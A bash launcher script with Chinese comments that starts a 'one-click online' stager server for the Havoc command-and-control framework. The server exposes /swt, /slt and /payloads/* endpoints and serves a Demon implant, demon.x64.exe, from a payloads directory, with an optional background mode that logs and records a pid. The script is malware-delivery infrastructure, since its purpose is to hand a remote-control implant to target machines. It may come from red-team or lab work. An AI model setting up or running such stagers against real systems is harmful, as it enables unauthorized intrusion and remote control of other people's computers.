#!/usr/bin/env bash
# 启动 Havoc「一键上线」暂存服务（/swt、/slt、/payloads/*）
#
# 用法：
#   ./start-stager.sh                 # 前台运行，Ctrl+C 停止
#   ./start-stager.sh --detach        # 后台运行，日志写 logs/stager.log
#   ./start-stager.sh --port 9901 --public-base http://192.168.121.132:9901
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

DETACH=0
ARGS=()
for arg in "$@"; do
    case "$arg" in
        -d|--detach) DETACH=1 ;;
        *)           ARGS+=("$arg") ;;
    esac
done

mkdir -p "$ROOT/logs"

COMMON=(
    "$ROOT/stager/stager_server.py"
    --payload-dir "$ROOT/payloads-out"
    --payload demon.x64.exe
)

if [[ "$DETACH" -eq 1 ]]; then
    if [[ -f "$ROOT/logs/stager.pid" ]] && kill -0 "$(cat "$ROOT/logs/stager.pid" 2>/dev/null)" 2>/dev/null; then
        echo "stager 已在运行（pid $(cat "$ROOT/logs/stager.pid")），如需重启请先 ./stop-stager.sh" >&2
        exit 0
    fi

    cd "$ROOT"
    setsid nohup python3 "${COMMON[@]}" ${ARGS[@]+"${ARGS[@]}"} \
        >> "$ROOT/logs/stager.log" 2>&1 < /dev/null &
    echo $! > "$ROOT/logs/stager.pid"
    echo "stager 已启动（pid $(cat "$ROOT/logs/stager.pid")）"
    echo "日志：$ROOT/logs/stager.log"
    exit 0
fi

exec python3 "${COMMON[@]}" ${ARGS[@]+"${ARGS[@]}"}
